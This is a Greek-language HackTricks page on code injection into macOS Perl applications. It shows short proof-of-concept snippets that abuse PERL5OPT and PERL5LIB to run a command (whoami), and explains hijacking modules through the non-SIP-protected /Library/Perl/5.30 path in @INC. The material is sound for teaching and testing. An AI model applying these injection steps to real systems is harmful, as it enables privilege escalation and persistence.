# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω της μεταβλητής περιβάλλοντος `PERL5OPT` & `PERL5LIB`

Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος PERL5OPT, είναι δυνατόν να κάνετε το perl να εκτελεί αυθαίρετες εντολές.\
Για παράδειγμα, δημιουργήστε αυτό το σενάριο:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Τώρα **εξάγετε τη μεταβλητή env** και εκτελέστε το **perl** σενάριο:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Μια άλλη επιλογή είναι να δημιουργήσετε ένα module Perl (π.χ. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Και στη συνέχεια χρησιμοποιήστε τις μεταβλητές περιβάλλοντος:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Μέσω εξαρτήσεων

Είναι δυνατή η καταγραφή της σειράς του φακέλου εξαρτήσεων που εκτελείται από το Perl:
```bash
perl -e 'print join("\n", @INC)'
```
Το οποίο θα επιστρέψει κάτι σαν:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Ορισμένοι από τους επιστρεφόμενους φακέλους δεν υπάρχουν καν, ωστόσο, **`/Library/Perl/5.30`** **υπάρχει**, **δεν είναι** **προστατευμένος** από **SIP** και είναι **πριν** από τους φακέλους **που προστατεύονται από SIP**. Επομένως, κάποιος θα μπορούσε να εκμεταλλευτεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε σενάρια εκεί, έτσι ώστε ένα σενάριο Perl υψηλής προνομιακής πρόσβασης να το φορτώσει.

> [!WARNING]
> Ωστόσο, σημειώστε ότι **πρέπει να είστε root για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτήν την **ειδοποίηση TCC**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Για παράδειγμα, αν ένα σενάριο εισάγει **`use File::Basename;`**, θα ήταν δυνατό να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελεί αυθαίρετο κώδικα.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
